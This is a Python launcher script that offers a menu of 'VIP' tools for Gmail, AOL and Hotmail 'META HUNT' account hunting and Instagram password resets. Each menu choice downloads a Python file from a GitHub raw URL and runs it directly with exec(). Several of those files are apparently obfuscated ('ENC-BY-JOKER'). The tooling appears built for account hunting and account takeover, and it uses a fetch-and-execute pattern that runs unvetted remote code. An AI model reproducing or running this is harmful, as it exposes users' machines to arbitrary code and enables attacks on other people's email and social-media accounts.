import requests as D
import os
from cfonts import render
vip = render('vip', colors=['white', 'yellow'], align='center')
print("\x1b[1;39m■" * 60)
print(vip)
print("~ Programmer : @ShridharX |  Channel: @ShridharLegacy ~")
print("\x1b[1;39m■" * 60)
print(f"""\x1b[38;5;117m1\x1b[38;5;231m - Gmail [META HUNT] [VIP] | \x1b[1;32m✅
\x1b[38;5;117m2\x1b[38;5;231m - Premium Aol 2011 [VIP] | \x1b[1;32m✅
\x1b[38;5;117m3\x1b[38;5;231m - Gmail+Hotmail+Aol [VIP] | \x1b[1;32m✅
\x1b[38;5;117m4\x1b[38;5;231m - Gmail + Aol Random [META HUNT] [VIP] | \x1b[1;32m✅
\x1b[38;5;117m5\x1b[38;5;231m - Gmail [META + META BUSINESS HUNT] [VIP] | \x1b[1;32m✅
\x1b[38;5;117m6\x1b[38;5;231m - Gmail [META + META BUSINESS HUNT] [VIP] [Termux/Linux] | \x1b[1;32m✅
\x1b[38;5;117m7\x1b[38;5;231m - Gmail [META + META BUSINESS HUNT] [VIP] [PC Only] | \x1b[1;32m✅
\x1b[38;5;117m8\x1b[38;5;231m - Instagram [Pass Reset] [VIP] [All Platforms] | \x1b[1;32m✅""")


def shridhar():
    print("\x1b[1;39m■" * 60)
    op = input(" • Your Choice: ")
    tools = {
        "1": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/%40ShridharX%20%5BVIP%5D%20%5BGMAIL%20META%231%5D%20%5BAIO%5D_ninjapy%20(1).py",
        "2": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/%40ShridharX%20%5BVIP%5D%20%5BAOL%231%5D%20%5BAIO%5D_ninjapy.py",
        "3": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/%40ShridharX%20%5BVIP%5D%20%5BG%2BH%2BA%231%5D%20%5BAIO%5D_ninjapy.py",
        "4": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/ENC-BY-JOKER.py",
        "5": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/ENC-BY-JOKER.py",
        "6": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/Termux.py",
        "7": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/ENC-BY-JOKER.py",
        "8": "https://raw.githubusercontent.com/shridhuu/Prono/refs/heads/main/Pass%20Reset.py",
    }

    if op in tools:
        gojo(tools[op])
    else:
        print("Please enter a number between 1 and 8.")
        shridhar()


def gojo(url):
    try:
        os.system('clear')
        exec(D.get(url).text)
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    shridhar()

# @ShridharX / @ShridharLegacy
